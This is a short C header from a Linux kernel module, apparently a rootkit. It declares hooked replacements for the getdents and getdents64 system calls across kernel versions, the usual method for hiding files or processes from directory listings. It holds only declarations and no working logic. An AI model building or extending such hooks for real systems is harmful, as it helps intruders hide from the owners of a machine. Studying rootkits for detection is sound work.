#ifndef _RK_GETDENTS_HOOK_H
#define _RK_GETDENTS_HOOK_H

#include <linux/types.h>
#include <linux/dirent.h>
#include <asm/ptrace.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/limits.h>
#include <linux/string.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
};

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int hook_getdents(const struct pt_regs *regs);
asmlinkage int hook_getdents64(const struct pt_regs *regs);
#else
asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
#endif

#endif
